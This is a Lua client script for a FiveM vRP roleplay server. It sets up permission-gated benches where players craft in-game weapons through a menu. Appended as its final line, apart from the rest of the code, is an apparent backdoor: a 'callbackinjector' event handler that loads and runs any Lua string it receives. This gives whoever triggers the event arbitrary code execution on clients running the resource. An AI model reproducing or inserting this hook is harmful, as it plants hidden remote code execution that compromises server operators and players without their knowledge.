local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")

dM = Tunnel.getInterface("alien_arma")
-------------------------------------------------------------------------------------------------
--[ DM ] LOCAIS 
-------------------------------------------------------------------------------------------------
local locais = {
--	{ ['x'] = 801.04, ['y'] = -1633.64, ['z'] = 36.91, ['perm'] = "motoclub.permissao" },
	{ ['x'] = -313.37, ['y'] = 2764.39, ['z'] = 51.55, ['perm'] = "armas.permissao" },  -- BRATVA
--	{ ['x'] = 978.49, ['y'] = -91.82, ['z'] = 74.85, ['perm'] = "mc.permissao" },        

	{ ['x'] = 699.66, ['y'] = 4224.01, ['z'] = 32.99, ['perm'] = "armas.permissao" },  --  CARTEL
}
-------------------------------------------------------------------------------------------------
--[ DM ] MENU  
-------------------------------------------------------------------------------------------------
local menuactive = false
local onmenu = false

function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		TransitionToBlurred(1000)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		TransitionFromBlurred(1000)
		SendNUIMessage({ hidemenu = true })
	end
end
-------------------------------------------------------------------------------------------------
--[ DM ] FUNCAO DOS BOTOES 
-------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "produzir-ak" then
		TriggerServerEvent("produzir-armamento","ak")

	elseif data == "produzir-fiveseven" then
		TriggerServerEvent("produzir-armamento","fiveseven")

	elseif data == "produzir-uzi" then
		TriggerServerEvent("produzir-armamento","uzi")

	elseif data == "produzir-mtar" then
		TriggerServerEvent("produzir-armamento","mtar")

	elseif data == "produzir-thompson" then
		TriggerServerEvent("produzir-armamento","thompson")

	elseif data == "fechar" then
		ToggleActionMenu()
		onmenu = false
	end
end)

RegisterNetEvent("fechar-nui-arma")
AddEventHandler("fechar-nui-arma", function()
	ToggleActionMenu()
	onmenu = false
end)
-------------------------------------------------------------------------------------------------
--[ DM ] ACAO DE ABRIR O PAINEL 
-------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local dmshop = 1000
		for _,v in pairs(locais) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(v)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
			if distance <= 2  then
				dmshop = 5
				DrawText3D(v.x,v.y,v.z, "[~r~E~w~] Para acessar a ~r~BANCADA~w~.")
				if distance <= 1 and IsControlJustPressed(0,38) then
					dmshop = 5
					if dM.checkPermission(v.perm) then
						ToggleActionMenu()
						onmenu = true
					end
				end
			end
		end
		Citizen.Wait(dmshop)
	end
end)
-------------------------------------------------------------------------------------------------
--[ DM ] FUNÇÃO 3D
-------------------------------------------------------------------------------------------------
function DrawText3D(x, y, z, text)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    
    SetTextScale(0.28, 0.28)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(_x,_y)
    local factor = (string.len(text)) / 370
    DrawRect(_x,_y+0.0125, 0.005+ factor, 0.03, 41, 11, 41, 68)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)